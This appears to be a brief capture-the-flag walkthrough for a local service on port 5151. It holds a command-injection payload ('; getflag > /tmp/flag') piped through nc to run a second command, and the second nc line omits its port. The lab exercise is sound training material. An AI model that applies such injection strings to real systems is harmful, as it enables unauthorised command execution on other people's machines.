### Documentation
[SHA](https://sha1.gromweb.com/?string=NotSoEasy)

### Process
1. `nc 127.0.0.1 5151`
    ```
    Password: test
    Erf nope..
    ```

2.  `echo "; getflag > /tmp/flag" | nc 127.0.0.1`

3. `cat /tmp/flag`